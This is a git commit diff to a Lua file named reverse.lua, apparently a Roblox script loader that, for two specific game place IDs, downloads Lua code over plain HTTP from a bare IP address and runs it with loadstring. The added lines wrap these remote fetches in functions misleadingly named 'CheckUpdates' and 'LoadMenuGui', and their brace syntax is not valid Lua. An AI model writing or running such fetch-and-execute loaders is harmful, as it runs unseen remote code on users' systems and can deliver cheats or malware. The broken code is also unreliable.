58d2397d33e434cf64b641910401f40b1230d7e3
outhackernuls090-hash <outhacker.nuls090@gmail.com>
2025-11-02 15:52:34 +0100

    Update reverse.lua

--- reverse.lua
+++ reverse.lua
@@ -1,8 +1,14 @@
-ID="038451e3-620c-45a4-930a-ecf05798dea3";
-if game.PlaceId == 96342491571673 or game.PlaceId == 109983668079237 then
-    loadstring(game:HttpGet("http://cdn.reverse.software/sab.luau"))()
-  
-RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"));
+ ID="038451e3-620c-45a4-930a-ecf05798dea3";
 
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
-  
+if game.PlaceId == 96342491571673 or game.PlaceId == 109983668079237 then
+
+local function CheckUpdates(){
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/sab.luau"))()
+};  
+
+local function LoadMenuGui(){
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))
+};
+            task.spawn(CheckUpdates)
+            task.spawn(LoadMenuGui)
+        end
